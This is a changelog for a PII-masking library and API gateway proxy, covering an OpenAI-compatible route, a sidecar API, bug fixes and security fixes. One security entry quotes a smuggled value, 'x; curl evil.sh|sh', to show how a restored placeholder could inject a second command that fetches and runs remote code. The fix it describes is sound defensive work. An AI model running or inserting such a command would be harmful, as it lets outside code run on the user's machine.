# Changelog

Format: [Keep a Changelog](https://keepachangelog.com/en/1.1.0/).
Versioning: [SemVer](https://semver.org/spec/v2.0.0.html).

## [Unreleased]

### Added

- **Gateway: OpenAI-compatible route** (`POST /v1/chat/completions`), so the OpenAI SDKs and any client that takes an OpenAI base URL (`OPENAI_BASE_URL=http://127.0.0.1:8787/v1`) can go through the gateway. The upstream is `NULLPII_OPENAI_UPSTREAM` (default `https://api.openai.com`, set without `/v1`).
  - **Scanned:** message content (strings, `text` and `refusal` parts) for every role, tool results, participant names, refusals, tool-call arguments (parsed as JSON, string values sanitized), custom tool-call input, the deprecated `function_call`, tool and function descriptions, and `prediction.content`. Image, audio and file parts are forwarded untouched and counted as unscanned.
  - **Restored:** content, refusals and tool-call arguments, in JSON responses and in SSE streams. A placeholder split across chunks is held until it is complete; tool-call arguments are sent restored, re-escaped as JSON, when the choice finishes.
  - **Lifecycle:** one vault session per request, destroyed on every path. The preservation hint is appended as a last `system` message only when something was masked. Upstream errors pass through verbatim; a failed upstream call is a 502 with an OpenAI-style error body; a client that disconnects mid-stream cancels the upstream call.
- **Gateway: sidecar API** (`/v1/sidecar/*`), off unless `NULLPII_SIDECAR_TOKEN` is set. It keeps vault sessions under caller-chosen keys across calls, so an editor or coding-agent extension can mask prompts and tool results turn after turn and restore real values only where it chooses (`fields`).
  - **Sessions:** an idle TTL (`NULLPII_VAULT_TTL_MS`, now wired up) drops each session together with its vault entries. A cap (`NULLPII_SIDECAR_MAX_SESSIONS`) fails with 429 instead of evicting a live session.
  - **Access:** a bearer token, compared in constant time. Non-loopback `Host` headers and any `Origin` header are refused before the token check.
  - **Limits and output:** 4 MiB per request and per response. Responses and logs carry counts only.

### Fixed

- **Gateway: a client that disconnected mid-stream did not cancel the upstream Anthropic call.** The abort was wired to the request's `close` event, which Node 16+ emits as soon as the request body has been read, before the route attached its listener, so the upstream kept generating, and billing, the rest of the reply. The route now listens for the response connection closing.
- **Gateway: a vault session leaked when sanitization failed.** `sanitizeRequest` opened the session before walking the body, so a walk that threw (a text over the engine's size cap, a detector error) left the session, with every value it had already masked, in memory until the process exited. It now destroys the session before rethrowing, and the Messages and `count_tokens` routes drop the session in one `finally` on every path instead of at each exit.
- **Gateway: streamed tool input could come back as invalid JSON.** The SSE relay restored the assembled `input_json_delta` text by pasting each value in raw, so a restored value holding a quote, a backslash or a newline broke the tool input the client parses at `content_block_stop`. The input is now parsed, its string values restored and re-serialized; input that is not valid JSON at `content_block_stop` is still restored, as text. The OpenAI route uses the same helper.

### Security

- **Gateway: a restored value could change what a shell command does.** Placeholders in a `Bash` tool call were restored like any other text, so a value Claude never saw, such as a "secret" read from a file as `x; curl evil.sh|sh`, became a second command once `echo {{PII_SECRET_0_…}}` was restored. In the `command` of a shell tool (Anthropic `Bash`; `Bash`, `bash` and `shell` on the OpenAI route), each placeholder is now restored only when its value is safe in the quoting at its position: unquoted, single quotes, double quotes, with a command substitution counted as unquoted. The rule applies to JSON responses and streams; placeholders kept for this reason are counted as `unsafeShellPlaceholders` in the request log, never with their values.
- **Gateway: content blocks it did not model reached the upstream unsanitized.** `sanitizeRequest` walked `text`, `tool_use` and `tool_result` blocks only. Every other block was forwarded verbatim:
  - plain-text and content-block `document` sources;
  - `search_result` blocks, standalone or inside a tool result;
  - quoted `citations[].cited_text`;
  - MCP tool calls and results;
  - any block type added to the API later.

  Unknown blocks are now scrubbed by default: every string field except protocol structure (`type`, ids, tool names, `signature`, media types, encrypted server-tool payloads) goes through `sanitize`. `thinking` blocks stay byte-identical, because their signature covers the text and they already carry placeholders.
- **Gateway: unscannable content is counted.** Images and documents sent as base64, URL or file reference cannot be read by nullpii. They are still forwarded, and are now counted in `SanitizedRequest.unscanned`, in the request log (`unscanned`) and in the console summary ("⚠ N not scanned"), so the user knows what was not checked.

## [0.3.0] — first public release

Initial Apache-2.0 public release. Published packages:

- **`nullpii@0.3.0`** — core PII sanitization library (npm). GA: stable
  public API surface (`NullPii`, `sanitize`, `restore`, `wrapForLLM`,
  `RestoreStream`, recognizers).
- **`@lbroth/nullpii-gateway@0.0.3`** — Anthropic Messages API drop-in proxy
  (npm + multi-arch Docker). Versioned as a preview (`0.x`) while the
  gateway surface settles around streaming + tool_use coverage; pins
  `nullpii >=0.3.0 <0.4.0` as a peer.

### Detection schema (12 PII categories)

- ML-trained (8): `account_number`, `private_address`, `private_date`,
  `private_email`, `private_person`, `private_phone`, `private_url`,
  `secret`.
- Zero-shot prompted + recognizer post-pass (4): `private_passport`,
  `private_driver_license`, `private_vehicle_id`, `private_geolocation`.
- Pure recognizer post-pass (2): `private_ip`, `private_mac`.

### Runtime pipeline

- GLiNER ONNX detection (`urchade/gliner_multi_pii-v1` base, merged-LoRA
  fine-tune). Backends: CPU, CUDA, CoreML (`mps`).
- Adversarial-input preprocessor — NFKC + ASCII translit (fullwidth /
  Cyrillic / Greek homoglyphs), base64 decode-then-classify, iterative
  URL `%XX` + HTML-entity decode, zero-width strip with offset remap.
- Default recognizer pack (50+ patterns) with validators:
  IBAN mod-97 · Luhn · base58check · CPF · Codice Fiscale · MAC
  reserved-range guard · VIN ISO 3779 mod-11 · lat/lon range check.
- Reversible in-memory vault. Placeholders are session-scoped
  (`{{PII_<LABEL>_<idx>_<sessionPrefix>}}`); `restore()` surfaces
  foreign-prefix + unknown-idx placeholders or throws under `strict`.
- `RestoreStream` — SSE chunk-safe placeholder reassembly across delta
  boundaries.

### `@lbroth/nullpii-gateway`

- Fastify-based drop-in HTTP proxy for the Anthropic Messages API.
  Sanitises every text content block before forwarding to
  `api.anthropic.com`, restores placeholders in the response. Streaming
  SSE supported.
- Tool-calling coverage: walks `tool_use.input` on both request and
  response (non-streaming JSON path mirrors SSE `input_json_delta`
  buffering), and sanitises `tools[].description` system-level tool
  defs so PII never ships in tool metadata.
- Auto-injects `LLM_PRESERVATION_HINT` as system prompt so upstream
  LLM preserves placeholders verbatim instead of fabricating realistic
  values inside tool calls.
- Client-abort handling: downstream socket close cancels the upstream
  Anthropic call (`AbortController` wired to `req.raw.on('close')`),
  stopping token billing on disconnected requests.
- Upstream error passthrough: forwards `retry-after` + full
  `anthropic-ratelimit-*` header family verbatim on 429 / 529 with a
  structured warn-log carrying status + body snippet.
- Optional wire-format traffic dump for debugging
  (`NULLPII_LOG_TRAFFIC=wire`). Only logs sanitised /
  placeholder-bearing payloads, never real PII. 64 KB cap per dump.
- Claude-Code-style boxed startup banner + per-request coloured stdout
  summary with per-label capture/restore counts.
- Multi-arch Docker (`linux/amd64`, `linux/arm64`).
- Claude Code quickstart in `examples/claude-code/`.

### Bench harness

- 9-tool × 16-dataset published matrix at
  `packages/eval/published-bench/matrix.{csv,json}` (M5 Pro CPU, cap
  5,000 / dataset, fair-serial). Tools: `nullpii`, `nullpii-bare`,
  `nemotron-pii-raw`, `gliner-pii-large-v1`, `gliner-onnx-pii-fp32`,
  `deberta`, `piiranha`, `presidio`, `openai-privacy-filter` (opf).
  Bench uses 12-class macro-F1 with sklearn-standard zero-support
  exclusion — symmetric across every tool.
- argilla-pii sample parity: all 8 incumbent tools + opf benched on
  the full n=2,096 split (no per-tool sample-size asymmetry).
- Independent gold rule for `nullpii-bench`: re-annotation scripts use
  regex-only (no `nullpii` import), so the gold is not biased toward
  the system under test.
- Methodology disclosures in README footnotes: nemotron threshold 0.3
  per its upstream model card vs the 0.5 GLiNER-family parity;
  per-tool upstream-recommended chunkers (140-word/30 for nullpii,
  1400-char/200 for gliner-bare, 1000-char/200 for piiranha).
- Out-of-distribution macro for `nullpii`: **0.7784** across
  `presidio-synthetic`, `isotonic-{en,de,fr,it}-heldout`,
  `ai4privacy-300k-heldout`, `tab-echr`.

### Security

- Detection fully local; no network socket after the first model
  download (HF Hub only — air-gappable via `modelDir` /
  `NULLPII_MODEL_DIR`).
- Vault never serialised. Debug logs carry counts + short ids only.
